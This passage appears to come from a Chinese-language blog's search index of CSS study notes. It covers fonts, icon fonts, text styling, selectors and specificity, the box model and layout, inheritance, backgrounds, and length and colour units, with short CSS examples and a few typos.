根元素的一个font-size\n\n\nfont-family：字体族（格式）\n\n可同时指定多个字体，字体间使用逗号隔开，字体生效时优先使用第一个，第一个无法使用则使用第二个，以此类推\n\n可选值：具体的字体名（eg.’微软雅黑’ ）或者 字体分类\n​    字体分类：浏览器自动使用该类别下的字体\n\nserif 衬线字体\nsans-serif 非衬线字体\nmonospace 等宽字体（每个字母宽度一样）\n\n\n若用户本地没有相关字体\n@font-face&#123;    /*指定字体的名字*/    font-family:&#x27;myfont&#x27;;    /*服务器中字体的路径，并确保兼容性*/    src:url(&#x27;./font/xxxx.ttf&#x27;)format(&#x27;truetye&#x27;);&#125;p&#123;    font-family:myfont;&#125;\n\n问题：加载速度、版权、字体格式\n\n\n\nfont-weight：字重\n\n可选值：\nnormal 默认值 不加粗\nbold 加粗\n100-900 九个级别（没什么用）\n\n\n\n\nfont-style：字体风格\n\n可选值：\nnormal 默认值 不斜体\nitalic 斜体\n\n\n\n\n\n字体的简写属性\nfont：字体大小 字体族；\n\ndiv&#123;    font:50px &#x27;Times New Roman&#x27;,Times,serif;&#125;\n\n\nfont：字体大小&#x2F;行高 字体族；\n\ndiv&#123;    font:50px/2 &#x27;Times New Roman&#x27;,Times,serif;&#125;/*行高可以省略不写 如果不写使用默认值*/\n\n\nfont：字重  字体风格 字体大小&#x2F;行高 字体族；\n\ndiv&#123;    font:bold italic 50px/2 &#x27;Times New Roman&#x27;,Times,serif;&#125;\n\n\n\n图标字体（iconfont）图标网站\nfontawesome：下载，将css和webfonts移动到项目中，将all.css引入网页中\niconfont（阿里）：加入购物车，项目下载，将内容移动到项目中，将iconfont.css引入网页中\n\n使用\n通过类名\n&lt;!--标签名随意，第一个类名：fas或fab，第二个类名：图标名（见文档）--&gt;&lt;i class=&quot;fas fa-bell&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fas fa-bell-slash&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fab fa-accessible-icon&quot;&gt;&lt;/i&gt;\n\n通过伪类\nli:before&#123;    /*图标编码（见文档）*/    content:&#x27;\\f1b0&#x27;;    /*图标字体族，根据fas或fab去下载的css文件里查*/    font-family:&#x27;Font Awesome 5 Free&#x27;;    /*根据fas或fab去下载的css文件里查*/    font-weight:900;&#125;\n\n通过实体\n&lt;!--实体开头&amp;结尾；中间#x加图标编码--&gt;&lt;i class=&quot;fas&quot;&gt;&amp;#f0f3x;&lt;/i&gt;\n\n\n以上以fontawesome为例\niconfont使用方法区别在于class&#x3D;”iconfont”\n\n行高（line-height）\n行高：文字占有的实际高度\n\n\n可选值：\n带单位：px、em\n不带单位：字体的倍数(默认行高为1.3左右)\n\n\n\ndiv&#123;    font-size:50px;    line-height:100px;&#125;div&#123;    font-size:50px;    line-height:2;&#125;\n\n\n字体框：字体存在的格子，设置font-size实际上就是在设置字体框的高度\n\n\n行高会在字体框的上下平均分配\n可以将行高设置为和元素高度一样的值，使单行文字居中\n\n行高还可用来设置行间距\n行间距 &#x3D; 行高 - 字体大小\n\n\n文本相关样式\ntext-align：文本的水平对齐\n\n可选值：\nleft 左对齐\nright 右对齐\ncenter 居中对齐\njustify 两端对齐\n\n\n\n\nvertical-align：文本的垂直对齐（适用于父子元素字体大小不一样）\n\n可选值：\n\nbaseline 默认值，基线对齐\ntop 顶部对齐\nbottom 底部对齐\nmiddle 居中对齐\n具体数值 px\n\n\n图片方面的应用：\n\n问题：图片默认情况下也按基线对齐（与下边框有一缝隙）\n\n\n解决：通过vertical-align取消基线对齐\n\n示例：\nimg&#123;    /*top或bottom都行，只要不是基线对齐*/    vertical-aglin:top;&#125;\n\n\n\n\ntext-decoration：文本修饰\n\n可选值：\nnone 什么都没有\nunderline 下划线\nline-through 删除下\noverline 上划线\n\n\ntext-decoration：修饰 颜色 样式\neg. text-decoration：underline red dotted；(IE浏览器不支持)\n\n\n\n\nwhite-space：处理空白\n\n可选值：\n\nnormal 正常\nnowrap 不换行\npre 保留空白（不会把换行变成空格）\n\n\n示例：\n.box2&#123;    width:200px;    /*设置不换行*/    white-space:nowrap;    /*将多余内容裁剪*/    overflow:hidden;    /*文本溢出时，溢出内容显示省略号*/    text-overflow:ellipsis;&#125;\n\n\ntext-indent：首行缩进\n\n\n","categories":["CSS"],"tags":["CSS","字体","图标","文本"]},{"title":"CSS基础（一）：选择器的分类及作用","url":"/2022/02/26/CSS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E9%80%89%E6%8B%A9%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BD%9C%E7%94%A8/","content":"常用选择器\n元素选择器\n作用：根据标签名来选中指定元素\n\n语法：标签名{}\n\n示例：\np&#123;\tcolor: red;&#125;h1&#123;    color: green;&#125;div&#123;    color: blue;&#125;\n\n\nid选择器\n作用：根据元素的id属性值选中一个元素（不能重复）\n\n语法：#id属性值{}\n\n示例：\n&lt;p id=&quot;red&quot;&gt;test&lt;/p&gt;\n\n#red&#123;\tcolor: red;&#125;#box&#123;\tcolor: red;&#125;\n\n\n类选择器\n作用：根据元素的class属性值选中一组元素（可重复）\n\n语法：.class属性值{}\n\n示例：\n&lt;p class=&quot;blue&quot;&gt;test1&lt;/p&gt;&lt;p class=&quot;blue red&quot;&gt;test2&lt;/p&gt;\n\n.blue&#123;\tcolor: blue;&#125;.red&#123;\tcolor: red;&#125;\n\n\n通配选择器\n作用：选中页面中的所有元素\n\n语法：*\n\n示例：\n*&#123;\tcolor: blue;&#125;\n\n\n\n复合选择器\n交集选择器\n作用：选中同时符合多个条件的元素\n\n语法：选择器1选择器2……选择器n{}\n\n示例：\ndiv.red&#123;    font-size:30px;&#125;.a.b.c&#123;    font-size:30px;&#125;/*语法上没问题，但没必要这么写，因为box1已经可以指定唯一元素*/div#box1&#123;    &#125;\n\n注意：交集选择器中如果有元素选择器，必须使用元素选择器开头\n\n\n\n并集选择器（分组选择器）\n作用：同时选择多个选择器对应的元素\n\n语法：选择器1，选择器2，……，选择器n{}\n\n示例：\nh1, span&#123;    &#125;/*交集并集组合，最后div.red表示class值为red的div*/#b1,.p1,h1,span,div.red&#123;    &#125;\n\n\n\n关系选择器\n元素关系\n\n父元素：直接包含子元素的元素\n子元素：直接呗父元素包含的元素\n祖先元素：直接或间接包含后代元素的元素（一个元素的父元素也是它的祖先元素）\n后代元素：直接或间接被祖先元素包含的元素（子元素也是后代元素）\n兄弟元素：拥有相同父元素的元素\n\n\n示例：\n&lt;div&gt;    我是一个div    &lt;p&gt;        我是div中的p元素        &lt;span&gt;我是p元素中的span元素&lt;/span&gt;    &lt;/p&gt;    &lt;span&gt;我是div中的span元素&lt;/span&gt;&lt;/div&gt;\n\n\n子元素选择器\n作用：选中指定父元素中的指定子元素\n\n语法：父元素 &gt; 子元素{}\n\n示例：\ndiv &gt; span&#123;    color: blue;&#125;div &gt; p &gt; span&#123;    &#125;\n\n\n后代元素选择器\n作用：选中指定元素中的指定后代元素\n\n语法：祖先  后代{}\n\n示例：\ndiv span &#123;    color: blue;&#125;\n\n\n兄弟元素选择器\n选中下一个兄弟元素\n\n语法：前一个 +  后一个{}\n\n示例：\np + span &#123;    color: blue;&#125;\n\n\n选中下边所有的兄弟\n\n语法：兄 ~  弟{}\n\n示例：\np ~ span &#123;    color: blue;&#125;\n\n\n\n\n\n属性选择器示例：\n&lt;p title=&quot;abc&quot;&gt;&lt;/p&gt;&lt;p title=&quot;abcdef&quot;&gt;&lt;/p&gt;&lt;p title=&quot;helloabc&quot;&gt;&lt;/p&gt;&lt;p title=&quot;heabcllo&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n\n\n选中含有指定属性的元素\n语法：[属性名]{}\n\n示例：\np[title]&#123;    color: blue;&#125;\n\n\n选中含有指定属性和属性值的元素\n语法：[属性名&#x3D;属性值]{}\n\n示例：\np[title=“abc”]&#123;    color: blue;&#125;\n\n\n选中属性值以指定值开头的元素\n语法：[属性名^&#x3D;abc]{}\n\n示例：\np[title^=“abc”]&#123;    color: blue;&#125;\n\n\n选中属性值以指定值结尾的元素\n语法：[属性名$&#x3D;abc]{}\n\n示例：\np[title$=“abc”]&#123;    color: blue;&#125;\n\n\n选中属性值含有某值的元素\n语法：[属性名*&#x3D;abc]{}\n\n示例：\np[title*=‘abc’]&#123;    color: blue;&#125;\n\n\n\n伪类选择器\n伪类（不存在的类，特殊的类）\n\n伪类用来描述一个元素的特殊状态\n比如：第一个子元素、被点击的元素、鼠标移入的元素……\n\n\n伪类一般情况下都是使用：开头\n\n\n示例：\n&lt;ul&gt;    &lt;li&gt;第一个&lt;/li&gt;    &lt;li&gt;第二个&lt;/li&gt;    &lt;li&gt;第三个&lt;/li&gt;    &lt;li&gt;第四个&lt;/li&gt;    &lt;li&gt;第五个&lt;/li&gt;&lt;/ul&gt;\n\n\n:first-child\n作用：选中第一个子元素\n\n示例：\nul&gt;li:first-child&#123;    color: blue;&#125;\n\n\n:last-child\n作用：选中最后一个子元素\n\n示例：\nul&gt;li:last-child&#123;    color: blue;&#125;\n\n\n:nth-child()\n作用：选中第n个子元素\n\n特殊值：\n\nn：全选中\n2n或even：选中偶数位的元素\n2n+1或odd：选中奇数位的元素\n\n\n示例：\nul&gt;li:nth-child(3)&#123;    color: blue;&#125;ul&gt;li:nth-child(n)&#123;    color: blue;&#125;\n\n\n\n\n以上这些伪类都是根据所有的子元素进行排序\n\n示例：\n&lt;ul&gt;    &lt;span&gt;第〇个&lt;/span&gt;    &lt;li&gt;第一个&lt;/li&gt;    &lt;li&gt;第二个&lt;/li&gt;    &lt;li&gt;第三个&lt;/li&gt;    &lt;li&gt;第四个&lt;/li&gt;    &lt;li&gt;第五个&lt;/li&gt;&lt;/ul&gt;\n\n\n:first-of-type\n示例：\nul&gt;li:first-of-type&#123;    color: blue;&#125;\n\n\n:last-of-type\n:nth-of-type\n\n\n以上这些伪类和上述的类似，不同点是它们是在同类型元素中进行排序\n\n\n:not() 否定伪类\n作用：将符合条件的元素从选择器中去除\n\n示例：\nul&gt;li:not(:nth-child(3))&#123;    color: blue;&#125;\n\n\n超链接的伪类（a元素的伪类）\n作用：将符合条件的元素从选择器中去除\n\n语法：\n\na:link{}\n用来表示没访问过的链接（正常的链接）\n\na:visited{}\n用来表示访问过的链接（点击过）\n由于隐私原因，visited这个伪类只能修改链接的颜色\n\n\n\n示例：\na:link&#123;    color:red;    font-size:20px;&#125;a:visited&#123;    color:orange;    /*font-size在visited中不起作用*/    font-size:20px;&#125;\n\n\n:hover 鼠标移入伪类\n作用：用来表示鼠标移入的状态\n\n示例：\na:hover&#123;    color:aqua;    font-size:50px;&#125;\n\n\n:active 鼠标点击伪类\n作用：用来表示鼠标点击\n\n示例：\na:active&#123;    color:aqua;    font-size:50px;&#125;\n\n\n\n\n注：有先后顺序之分，link、vidited、focus、hover、active（其中link和visited顺序可交换\n\n伪元素选择器\n伪元素（不存在的元素，特殊的位置）\n\n伪类一般情况下都是使用 :: 开头\n\n\n示例：\n&lt;ul&gt;    &lt;li&gt;第一个&lt;/li&gt;    &lt;li&gt;第二个&lt;/li&gt;    &lt;li&gt;第三个&lt;/li&gt;    &lt;li&gt;第四个&lt;/li&gt;    &lt;li&gt;第五个&lt;/li&gt;&lt;/ul&gt;\n\n\n::first-letter{}\n作用：表示第一个字母\n\n示例：\np::first-letter&#123;    font-size:50px;&#125;\n\n\n::first-line{}\n作用：表示第一行\n\n示例：\np::first-line&#123;    background-color:yellow;&#125;\n\n\n::selection{}\n作用：表示选中的内容\n\n示例：\np::selection&#123;    background-color:greenyellow;&#125;\n\n\n::before{}\n作用：表示元素的开始，必须结合content属性一起用\n\n示例：\ndiv::before&#123;    /*在div中最开头出现红色abc字样，因为它是通过css加的，所以它无法被选中*/    content:&#x27;abc&#x27;;    color:red;&#125;\n\n\n::after{}\n作用：表示元素的最后，必须结合content属性一起用\n\n示例：\ndiv::before&#123;    /*在div中最开头出现红色abc字样，因为它是通过css加的，所以它无法被选中*/    content:&#x27;abc&#x27;;    color:red;&#125;\n\n\n\n","categories":["CSS"],"tags":["CSS"]},{"title":"CSS基础（三）：选择器的权重","url":"/2022/02/27/CSS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E9%80%89%E6%8B%A9%E5%99%A8%E7%9A%84%E6%9D%83%E9%87%8D/","content":"\n样式的冲突：通过不同的选择器，选中相同的元素，并且为相同的样式设置不同的值。\n发生样式冲突时，应用哪个样式由选择器的权重（优先级）决定\n\n选择器的权重（css specificity）排序\n内联样式\n优先级：1,0,0,0（最高）\n\n示例：\n&lt;div id=&quot;box1&quot; class=&quot;red&quot; style=&quot;background-color:skyblue&quot;&gt;    我是一个div&lt;/div&gt;\n\n\nid选择器\n优先级：0,1,0,0\n\n示例：\n#box1&#123;    background-color:orange;&#125;\n\n\n类、伪类选择器、属性选择器\n优先级：0,0,1,0\n\n示例：\n.red&#123;    background-color:red;&#125;\n\n\n元素选择器\n优先级：0,0,0,1\n\n示例：\ndiv&#123;    background-color:yellow;&#125;\n\n\n通配选择器\n优先级：0,0,0,0\n\n示例：\ndiv&#123;    font-size:20px;&#125;*&#123;    font-size:50px;&#125;/*则字体显示为20px大小*/\n\n\n继承的样式\n优先级：没有优先级\n\n示例：\n&lt;div&gt;    我是一个div    &lt;span&gt;我是div中的span&lt;/span&gt;&lt;/div&gt;\n\ndiv&#123;    font-size:20px;&#125;*&#123;    font-size:50px;&#125;/*则“我是一个div”字体显示为20px大小，“我是div中的span”字体显示为50px*/\n\n\n\n\n比较优先级时，需要将所有的选择器的优先级进行相加计算，最后优先级越高，则越优先显示（分组选择器是单独计算的，不会相加）\n\n\n示例：\n/*优先级为0，0，0，1*/div&#123;    background-color:yellow;&#125;/*优先级为0，1，0，1*/div#box&#123;    background-color:orange;&#125;/*单独计算优先级，在选择器内不参与累加*/div,p,span&#123;    background-color:orange;&#125;\n\n\n选择器的累加不会超过器最大的数量级，比如：类选择器再高也不会超过id选择器\n\n\n示例：\n/*优先级为0，1，0，0*/#box&#123;    background-color:yellow;&#125;/*优先级不超过0，1，0，0*/.d1.d2.d3.d4.d5.d6.d7.d8.d9.d10.d11&#123;    background-color:yellow;&#125;\n\n\nTips：选择器写得越具体、越长，优先级越高。\n\n\n若优先级计算后相同，则优先使用靠下的样式\n\n\n示例：\n&lt;div class=&quot;d1 d2&quot;&gt;    &lt;/div&gt;\n\n.d1&#123;    background-color:yellow;&#125;.d2&#123;    background-color:red;&#125;/*则背景显示为红色*/\n\n\n可以在某一个样式后边添加 ！important，则此时该样式会获取到最高的优先级，甚至超过内联样式\n\n\n示例：\n&lt;div id=&quot;box1&quot; class=&quot;d1&quot; style=&quot;background-color:skyblue&quot;&gt;    我是一个div&lt;/div&gt;\n\n.d1&#123;    background-color:yellow !important;&#125;/*则背景显示为黄色*/\n\n\n注意：在开发中要慎用 ！important。\n\n","categories":["CSS"],"tags":["CSS"]},{"title":"CSS基础（五）：布局相关知识","url":"/2022/03/01/CSS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E5%B8%83%E5%B1%80%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/","content":"文档流（normal flow）\n网页是一个多层结构，用户只能看到最顶层\n最底下的一层称为文档流，文档流是网页的基础\n创建的元素默认都在文档流中进行排列\n元素主要有两个状态：\n\n​    在文档流中\n\n​    不在文档流中（脱离文档流）\n\n\n\n元素在文档流中的特点\n块元素\n总是独占一行（无论多宽，自上向下垂直排列）\n默认宽度：父元素的全部（即把父元素撑满）\n默认高度：被子元素（子元素）撑开\n比如：div\n\n\n行内元素\n不会独占一行，只占自身大小（从左到右水平排列）\n若一行中不能容纳下所有行内元素，则换行（与书写习惯一致）\n默认宽度：被子元素（子元素）撑开\n默认高度：被子元素（子元素）撑开\n设置宽高不能生效\n\n\n\n\n一旦块元素和行内元素脱离文档流，则不具备以上特点\n\n盒子模型（box model）\n所有元素都是一个矩形的盒子\n每个盒子都由几个部分组成：\n\n内容区（content）：内容区大小由width和height决定\n内边距（padding）：会影响盒子大小\n边框（border）：会影响盒子大小\n外边距（margin）\n\n盒子的可见框的大小，默认情况下由内容区、内边距、边框共同决定\n盒子的实际大小，还受外边距影响\n\n边框（border）\n边框宽度：border-width\n可只指定四个方向的边框宽度（顺时针）\n\n如果省略，一般为3px\n\n四个值：上 右 下 左\n\n三个值：上 左右 下\n\n两个值： 上下 左右\n\n一个值：上下左右\n\n示例：\n/*上 右 下 左*/border-width:10px 20px 30px 40px;/*上 左右 下*/border-width:10px 20px 30px;/*上下 左右*/border-width:10px 20px;/*上下左右*/border-width:10px;\n\nborder-xxx-width：\nxxx可以是 top right bottom left\n\n\n\n边框颜色：border-color\n可只指定四个方向的边框颜色：规则同上\n如果省略，默认使用color的值（color默认为black）\n\n\n边框样式：border-style\n可只指定四个方向的边框样式：规则同上\nsolid 实线、dotted 点状虚线、dashed 虚线、double 双线\n不可省略，默认值为none\n\n\nborder简写属性（最常用）\nborder：width color style; (可改变顺序)\n\n示例：\n.box1&#123;    border:10px orange solid;&#125;\n\nborder-xxx 同理\nxxx可以是 top right bottom left\n\n\n\n边框圆角：border-radius\nborder-radius\n\n四个值：左上 右上 右下 左下\n三个值：左上 右上&#x2F;左下 右下\n两个值：左上&#x2F;右下 右上&#x2F;左下 \n一个值：四个角\n\n .box1&#123;    /*半径为10px*/    border-radius:10px;&#125;.box1&#123;    /*分别指定四个角的圆角*/    border-radius:10px 20px 30px 40px;&#125;/*椭圆角*/.box1&#123;    /*水平半径为10px 垂直半径为20px*/    border-radius:10px / 20px;&#125;/*将元素设置为圆形*/.box1&#123;    border-radius:50%;&#125;\n\nborder-top-left-radius\n /*椭圆*/.box1&#123;    /*水平半径为10px 垂直半径为20px*/    border-top-left-radius:10px 20px;&#125;\n\nborder-top-right-radius\n\nborder-bottom-left-radius\n\nborder-bottom-right-radius\n\n\n\n\n内边距（padding）\n内边距：内容区和边框之间的距离\n内边距的设置会影响到盒子的大小\n背景颜色会延伸到内边距上\n\n\npadding-top\npadding-right\npadding-bottom\npadding-left\n简写padding:\n规则同border-width\n\n\n\n外边距（margin）\n外边距不会影响盒子可见框大小\n但是会影响盒子的位置（即影响盒子实际大小）\n\n\nmargin-top\n上外边距，设置一个正值，元素（自身）会向下移动\n\n\nmargin-right\n默认情况下，不会产生任何效果；总是被自动调整\n\n\nmargin-bottom\n下外边距，设置一个正值，其下边的元素会向下移动\n\n\nmargin-left\n左外边距，设置一个正值，元素（自身）会向右移动\n\n\n\n\n负值则方向相反\n\n\n简写margin:\n规则同border-width\nmargin: 0px auto (水平居中)\n\n\n\n外边距重叠问题（垂直外边距的重叠）\n相邻的垂直方向的外边距会发生重叠现象\n\n兄弟元素间的垂直外边距\n两者都是正值：取两者之间的较大值\n特殊情况：\n一正一负：取两者之和\n都负：取绝对值较大值\n\n\n兄都元素之间的外边距重叠对开发有利，不需要处理\n\n父子元素间的垂直外边距\n父子元素间的相邻外边距，子元素会传递给父元素（上外边距）\n示例：\n&lt;div class=&quot;box1&quot;&gt;    &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt;&lt;/div&gt;\n\n.box1&#123;    width:200px;    height:200px;    background-color:#bfa;&#125;.box2&#123;    width:100px;    height:100px;    background-color:orange;    margin-top:100px&#125;\n\n效果：\n\n\n​    \n\n处理方式：\n\n开启父元素的BFC：见CSS提升（二）：高度塌陷问题\n\n消除”相邻”条件：利用display:table(before伪类)\n.box1&#123;    width:200px;    height:200px;    background-color:#bfa;&#125;/*利用**display:table**(before伪类)*/.box1::before&#123;    content:&#x27;&#x27;;    display:table&#125;.box2&#123;    width:100px;    height:100px;    background-color:orange;    margin-top:100px&#125;\n\n效果：\n\n\n\n\n\n盒子的大小盒子的可见框大小\n默认情况：由内容区、内边距、边框共同决定\nbox-sizing：用来设置盒子尺寸的计算方式，即设置width和height的作用\n可选值：\ncontent-box：默认值，宽度和高度用来设置内容区的大小\nborder-box：宽度和高度用来设置整个盒子的可见框大小（width和height指的是内容区和边框的总大小，不包括外边距）\n\n\n\n\n\n盒子的实际大小\n还受外边距影响\n\n盒子的水平布局 （等式）\n元素在其父元素中水平方向的位置由一下几个属性共同决定：\n\nmargin-left\nborder-left\npadding-left\nwidth\npadding-right\nborder-right\nmargin-right\n\n\n一个元素在其父元素中水平布局必须要满足以下式：\n\nmargin-left + border-left + padding-left + width + padding-right + border-right + margin-right &#x3D; 其父元素内容区的宽度\n\n若相加结果使等式不成立，称为过度约束，则等式会自动调整：\n\n如果这七个值中没有为auto的情况：\n则浏览器会自动调整margin-right值以使等式满足\n\n这七个值中有三个可以设置为auto：\n\nwidth\n\nmargin-left\n\nmargin-right\n(padding不可以自动调整)\n\n\n\n若某个值为auto，则自动调整设有auto的那个属性使等式成立\n（width的值默认是auto）\n若将width和一个外边距设置为auto，则width调整为最大，设置为auto的外边距会自动为0\n若将两个外边距设置为auto，width固定，则外边距设置为相同值（居中）\n若将三个值都设置为auto，则width调整为最大，外边距都为0\n\n\n\n盒子的垂直布局 （溢出问题）\n默认情况下父元素的高度被内容撑开\n\noverflow （用于解决溢出）\n溢出：子元素的大小超过了父元素，则子元素从父元素中溢出\n解决溢出：使用overflow属性设置父元素\n可选值：\nvisible（默认值）：溢出\nhidden：溢出的内容被裁剪不会显示\nscroll：生成两个（垂直+水平）滚动条，通过滚动条查看完整内容\nauto：根据需要生成滚动条\n\n\noverflow-x：单独处理水平\noverflow-y：单独处理垂直\n\n\n以上所有内容以块元素为例(div)\n\n行内元素的盒模型\n行内元素不支持设置宽度和高度，内容区大小由内容直接决定\n行内元素可以设置padding，但是垂直方向padding不会影响页面的布局\n行内元素可以设置border，但是垂直方向border不会影响页面的布局\n行内元素可以设置margin，但是垂直方向margin不会影响页面的布局\n\ndisplay（块元素和行内元素相互转换）\n设置元素显示的类型（块元素和行内元素相互转换）\n可选值：\ninline：设置为行内元素\nblock：设置为块元素\ninline-block：设置为行内块元素（开发时不常用）\n既可以设置宽度和高度，又不会独占一行\n\n\ntable：设置为一个表格\nnone：不显示（隐藏），不占据页面位置\n\n\n应用：下拉框none—&gt;block\n\nvisibility\n设置元素显示的状态\n可选值：\nvisible：默认值，元素正常显示\nhidden：不显示（隐形），但是依然占据页面的位置\n\n\n\n轮廓（outline）\n与border区分\n\n不同点：轮廓不会影响到可见框的大小，不影响页面布局\n\n\noutline多应用于鼠标悬停时：\n.box1:hover&#123;    outline:10px red solid;&#125;\n\n阴影（box-shadow)\n不影响页面布局\n\n语法：box-shadow：水平偏移量 垂直偏移量 模糊半径颜色\n\n水平偏移量：设置阴影水平位置，正值向右移动，负值相反\n垂直偏移量：设置阴影垂直位置，正值向下移动，负值相反\n模糊半径：越大越模糊\n颜色：rgba(0，0，0，.3)\n\n\n示例：\n.box1&#123;    box-shadow:10px 10px 50px rgba(0,0,0,.3)&#125;\n\n浏览器的默认样式\n浏览器会为元素设置默认样式，开发时需要去除默认样式（pc端）\n\n去除默认样式bady&#123;    magin:0;&#125;p&#123;    magin:0;&#125;ul&#123;    magin:0;    padding:0;    list-style:none;/*去除项目符号*/&#125;/*通常情况下简单写法*/*&#123;    margin:0;    padding:0;&#125;ul&#123;    list-style:none;/*去除项目符号*/&#125;\n\n最完美的写法，通过引入重置样式表\n\nreset.css：直接去除浏览器的默认样式\nnormalize.css：对默认样式进行了统一\n\n","categories":["CSS"],"tags":["CSS","盒子模型","块元素","行内元素"]},{"title":"CSS基础（二）：继承","url":"/2022/02/27/CSS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E7%BB%A7%E6%89%BF/","content":"定义为一个元素设置的样式同时也会应用到它的后代元素上，发生在祖先和后代之间\n作用继承的设计是为了方便开发，利用继承可以将一些通用的样式统一设置到共同的祖先元素上，这样就只需设置一次即可让所有的元素都具有该样式\n注意并不是所有的样式都会被继承，比如：背景相关、布局相关的这些样式有不会被继承。可通过查阅文档（inherited）看是否被能够被继承\n示例&lt;p&gt;    我是一个p元素    &lt;span&gt;我是p元素中的span&lt;/span&gt;&lt;/p&gt;\n\np&#123;    /*则p和span中文字都变红*/    color:red;    /*则p背景变橙色，span背景为默认值透明，但看起来也是橙色*/    background-color:orange;&#125;\n\n","categories":["CSS"],"tags":["CSS"]},{"title":"CSS基础（六）：背景","url":"/2022/03/03/CSS%E5%9F%BA%E7%A1%80%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E8%83%8C%E6%99%AF/","content":"背景相关样式\nbackground-color：背景颜色\n\nbackground-image ：背景图片\n\nurl(.&#x2F;img&#x2F;1.png) 或 url(‘.&#x2F;img&#x2F;1.png’)\n\n可同时设置背景颜色和背景图片\n\n若背景图片小于元素，则自动平铺\n\n若背景图片大于元素，则裁剪\n\n渐变：\n\n线性渐变：linear-gradient（方向，开头颜色，结束颜色）\n方向：to left,to right,to bottom, to top, xxxdeg(度数)，.xxturn(圈数)\n可指定多种颜色，默认情况下平均分，也可手动指定渐变情况\n\n平铺线性渐变：repeating-linear-gradient()\n\n径向渐变：radial-gradient（形状 at 位置，颜色 位置，颜色 位置，颜色 位置）\n可手动指定渐变的大小、渐变的位置\n\n\n\n\n\nbackground-repeat：背景图片重复方式\n\n可选值：\nrepeat 默认值，沿x轴、y轴双方向重复\nrepeat-x 沿x轴重复\nrepeat-y 沿y轴重复\nno-repeat 不重复\n\n\n\n\nbackground-positon：背景图片位置\n\n方位词：top left right bottom center 组合（九宫格）\nbackground-positon: top lleft\n同时指定两个值，若只写一个则第二个默认center\n\n偏移量：水平方向偏移量 垂直方向偏移量\nbackground-positon:100px 100px \n实际开发中，用负值较多\n\n应用：CCS-Sprite技术（雪碧图or精灵图）\n解决浏览器第一次加载时图片闪烁的问题\n将多个小图片统一保存到一个大图片中，通过调整background-position来切换显示的图片\n\n\n\n\nbackground-clip：背景的范围\n\n可选值：\nborder-box 默认值，背景会出现在边框的下面\npadding-box 背景不会出现在边框下面，只出现在内容区和内边距\ncontent-box 背景只会出现在内容区\n\n\n\n\nbackground-origin：背景图片的偏移量计算的原点\n\n可选值：\npadding-box 默认值，原点从内边距处开始计算\ncontent-box 原点从内容区处开始计算\nborder-box 原点从边框处开始计算\n\n\n\n\nbackground-size：背景图片的大小\n\n可选值：\n\n宽度 高度 （100% auto）\n如果只写一个，则第二个值默认auto，等比例缩放\n\ncover 图片的比例不变，将元素铺满\n\ncotain 图片的比例不变，将图片在元素中完整显示\n\n\n\n\n\nbackground-attachment：背景图片是否跟随元素移动（父元素设置overflow：auto出现滚动条时）\n\n可选值：\nscroll 默认值，背景图片会跟随元素移动\nfixed 背景图片会固定在页面中，不会随元素移动\n\n\n\n\nbackground 背景相关简写属性\n.box&#123;    background：#bfa url(&#x27;./img/1.png&#x27;)  center center/contain border-box content-box no-repeat;&#125;\n\n没有顺序要求，可省略\n注：\n\nbackground-size必须卸载background-position的后面，并且用&#x2F;隔开：background-size&#x2F;background-position\nbackground-origin要在background-clip前面\n\n\n\n","categories":["CSS"],"tags":["CSS","背景"]},{"title":"CSS基础（四）：单位","url":"/2022/03/01/CSS%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E5%8D%95%E4%BD%8D/","content":"长度单位\n像素 （px）\n不同屏幕的像素大小不同，像素越小的屏幕显示效果越清晰\n同样的200px在不同的设备下显示效果不一样\n\n\n百分比 （%）\n将其属性值设置为相对于其父元素属性的百分比\n设置百分比可以使子元素跟随父元素的改变而改变\n\n\nem\nem是相对于元素（自身）的字体大小来计算\n\n1em &#x3D; 1 font-size\n1 font-size &#x3D; 16px（默认）\n\nem会根据字体大小的改变而改变\n\n示例：\n/*盒子大小为160px*/.box1&#123;    font-size:16px;    width:10em;    height:10em;   \tbackground-color:greenyellow;&#125;/*盒子大小为200px*/.box2&#123;    font-size:20px;    width:10em;    height:10em;   \tbackground-color:greenyellow;&#125;\n\n\nrem\nrem是相对于根元素（html）的字体大小来计算\n\n在移动端用得挺多\n\n示例：\nhtml&#123;    font-size:30px;&#125;/*盒子大小为300px*/.box1&#123;    width:10rem;    height:10rem;   \tbackground-color:greenyellow;&#125;\n\n\nvw\n表示视口宽度（viewport width)\n\n100vw &#x3D; 一个视口的宽度、1vw &#x3D; 1%视口宽度\n\n与百分比不同：vw总是参考于视口宽度\n\n设计图的宽度：\n二倍图：750px，三倍图：1125px\n\n\n结合vm和rem来表示长度\n@total-width:750;html&#123;    //设置rem的比值，*40是因为浏览器不支持比12px小的字体    font-size:100vw/@total-width * 40;&#125;.box1&#123;    width:(175/40)rem;&#125;\n\n\n\n颜色单位\n颜色名\n比如：red、orange、yellow、blue、green……\n\n\nRGB\n语法：rgb(红，绿，蓝) \n\n取值范围：0~255\n\n特殊值：rgb（0，0，0）黑色\n​                rgb（255，255，255）白色\n\n\n\nRGBA\n语法：rgb(红，绿，蓝，透明度)\n\n特殊值：rgb（176,199,167，1）完全不透明\n​                rgb（176,199,167，0）完全透明\n​                rgb（176,199,167，.5）半透明\n\n\n\n十六进制的RGB\n语法：#红绿蓝 \n\n取值范围：00~ff  \n\n特殊值：#ff0000 红色\n​                #00000 白色\n\n如果颜色两位两位重复可以简写：\n#aabbcc –&gt; #abc\n#aabbcd 不能简写\n\n\n\nHSL、HSLA\nH 色相：0~360\nS 饱和度：0%~100% （0%灰）\nL 亮度：0%~100%（0%黑，50%正，100%白）\nA 